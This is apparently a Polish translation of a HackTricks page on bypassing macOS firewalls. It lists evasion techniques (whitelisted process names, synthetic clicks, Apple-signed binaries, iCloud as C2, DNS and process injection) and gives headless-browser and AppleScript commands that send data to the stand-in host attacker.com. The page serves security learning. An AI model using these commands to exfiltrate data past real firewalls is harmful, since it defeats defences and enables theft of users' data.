# Bypassowanie zapór sieciowych w macOS

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Znalezione techniki

Poniższe techniki zostały znalezione działające w niektórych aplikacjach zapór sieciowych macOS.

### Nadużywanie nazw na białej liście

* Na przykład nazywanie złośliwego oprogramowania nazwami znanych procesów macOS, takich jak **`launchd`**

### Syntetyczne kliknięcie

* Jeśli zapora prosi użytkownika o zgodę, złośliwe oprogramowanie może **kliknąć na zezwolenie**

### **Użyj podpisanych binariów Apple**

* Takich jak **`curl`**, ale także inne, takie jak **`whois`**

### Znane domeny Apple

Zapora może zezwalać na połączenia z znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. A iCloud może być używany jako C2.

### Ogólne Bypassowanie

Kilka pomysłów na próbę obejścia zapór sieciowych

### Sprawdź dozwolony ruch

Znajomość dozwolonego ruchu pomoże Ci zidentyfikować potencjalnie uwzględnione na białej liście domeny lub aplikacje, które mają do nich dostęp.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Nadużywanie DNS

Rozdzielanie DNS odbywa się za pomocą podpisanego aplikacji **`mdnsreponder`**, która prawdopodobnie będzie miała zezwolenie na kontakt z serwerami DNS.

<figure><img src="../../.gitbook/assets/image (464).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Poprzez aplikacje przeglądarki

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Poprzez wstrzykiwanie procesów

Jeśli możesz **wstrzyknąć kod do procesu**, który ma zezwolenie na połączenie z dowolnym serwerem, możesz ominąć zabezpieczenia zapory ogniowej:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referencje

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
